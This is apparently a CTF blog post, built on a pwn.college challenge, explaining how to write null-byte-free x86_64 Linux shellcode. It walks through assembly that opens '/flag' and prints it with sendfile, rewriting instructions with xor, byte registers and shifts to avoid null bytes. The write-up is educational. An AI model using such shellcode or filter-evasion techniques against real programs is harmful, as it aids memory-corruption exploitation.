---
layout: post
title: Writing a null byte free shellcode for x86_64 Linux
date: 2025-02-21 00:13:37 +0300
description: 
img: removingnullbytes/cover_nullbytes.png
fig-caption: 
tags:
  - ctf
---
*When writing the assembly to create a shellcode, normally we face challenges like having the need to create a null byte free one. This post will show you the principle to remove null bytes in your code without using any tools.*

# TL;DR;
- Avoid using instructions without the exact amount of bytes you want to manipulate, because widening instructions will produce  null bytes to (e.g.) put a 8-bit operand into a 64-bit register.
- Do `xor rax, rax` instead of `mov rax, 0`
- Perform shift left operations for non 8-bit multiple numbers.

# Writing a simple shellcode to retrieve data from "/flag"
There are some CTF challenges out there that need you to send some shellcode in order to read the flag. I will use *[pwn.college](https://pwn.college)* example to make things easy to understand.

The challenge itself asks us to do a simple thing: input a shellcode to read the contents of the flag in "**/flag**", but the program would filter out all the null bytes present in the shellcode and execute it. 

Let's write some code to do it!

*Shellcode to read contents of "/flag"*
```assembly
.global _start
_start:
.intel_syntax noprefix

; syscall for open(/flag)
mov rax, 2
mov rbx, 0x67616c662f
push rbx
mov rdi, rsp
mov rsi, 2
mov rdx, 0
syscall

; syscall for sendfile and print to stdout
mov rsi, rax
mov rdi, 1
mov rdx, 0
mov r10, 64
mov rax, 40
syscall
```

After compiling it, let's see the bytecode of it

![](../assets/img/removingnullbytes/Pasted%20image%2020250221103405.png)
*Shellcode bytecode*

See the amount of null bytes produced? Normally programs would block (or filter) them because they are normally very problematic for the program functions (e.g. The null byte "**\\0**" is the delimiter for the end of a string in *strlen()*). Since the program just filter the null bytes out and execute it, it would break the code if we let it this way.

This is due to the amount of widening functions present, widening instructions will produce null bytes to (e.g.) put a 8-bit operand into a 64-bit register, like using `mov rax, 1` will literally move `00000001` value into the *RAX* register, and all those zeros will be present in the program bytes.

How do we circumvent that? Changing widening functions to exact size operations.

# Breaking down instructions

Let's analyze each step of the shellcode and change it for something without the null bytes, this will make you understand the principle behind the optimization.

> Below each code block, pay attention on how the null byte free code won't have the 00's present. 

## *mov rax, 2*
In this line we are preparing *RAX* for the *open()* syscall.

```c
mov rax, 2 
```
*Bytecode produced: 48C7C002**000000***

Like said before, this will basically move `00000002` into the *RAX* register. To change this to a shorter operation, we could perform a *XOR* operation in the *RAX* register, because perfoming a *XOR* operation using the same values will always result in 0, so we can empty the register fully. Then add `2` to the *AL* register, essentially moving a byte sized `02` into the register, avoiding all those zeros, and creating a null byte free bytecode.

```c
xor rax, rax
mov al, 2
```
*Bytecode produced: 4831C0B002*
## *mov rbx, 0x67616c662f*
In this line we are moving the "**/flag**" string to the register.

The reason behind the issue with this, is the same as before, moving a 5 byte value using a 8 byte operation, that will essentially produce 3 null bytes. 

```c
mov rbx, 0x67616c662f
```
*Bytecode produced: 48BB2F666C6167**000000***

Since we do not have a specific 5 byte instruction/register for this, there is another option:
- Performing a 4 byte (DWORD) operation to put 4 bytes of the value;
- Shift 8 bits (a byte) to the left;
- Fill the remaining byte with the byte instruction;

Let's see the code

```c
mov ebx, 0x67616c66
shl rbx, 8
mov bl, 0x2f
```
*Bytecode produced: BB666C616748C1E308B32F*

So we moved the first part of `0x67616c662f`, which is `0x67616c66`, to a 32-bit register *EBX*. Then we moved 8 bits to the left, and moved `0x2f` to the *BL* register, performing exact sized operations.

> With this same technique, supposing that you NEED a null byte to be placed in between a value, you could shift 16-bits (2 bytes) to the left, and fill the remaining byte, leaving a null byte in the register, but not present in the shellcode!
> 
> Like
```
mov ax, 0xcafe
shl rax, 16
mov al, 0xff
```
> Would result in a `0xcafe00ff` succesfully.

## *mov rdi, 1*
This is an alternative to the `mov rax, 2` presented before. Since we also could perform a *XOR* operation and do `mov dil, 1`, is also possible to *XOR* the *RDI* register and *inc rdi* to add 1 to the register.

```c
mov rdi, 1
```
*Bytecode produced: 48C7C701**000000***

```c
xor rdi, rdi
inc rdi
```
*Bytecode produced: 4831FF48FFC7*

# Putting the pieces together
With all things we already saw, performing all the changes to the code, the result is the final code presented:

*Final shellcode*
```asm
.global _start
_start:
        .intel_syntax noprefix
	    
	    ; syscall for open(/flag)
        xor rax, rax
        mov al, 2
        xor rbx, rbx 
        mov ebx, 0x67616c66
        shl rbx, 8
        mov bl, 0x2f
        push rbx
        mov rdi, rsp
        xor rsi,rsi
        mov sil, 2
        xor rdx, rdx
        syscall
        
	    ; syscall for sendfile and print to stdout
        mov rsi, rax
        xor rdi, rdi
        inc rdi
        xor rdx, rdx
        xor r10, r10
        mov r10b, 64
        xor rax, rax
        mov al, 40
        syscall
```

Now if we analyze the shellcode, we managed to remove all the null bytes we had before and even make the code smaller!

![](../assets/img/removingnullbytes/Pasted%20image%2020250221103732.png)
*Final shellcode bytecode*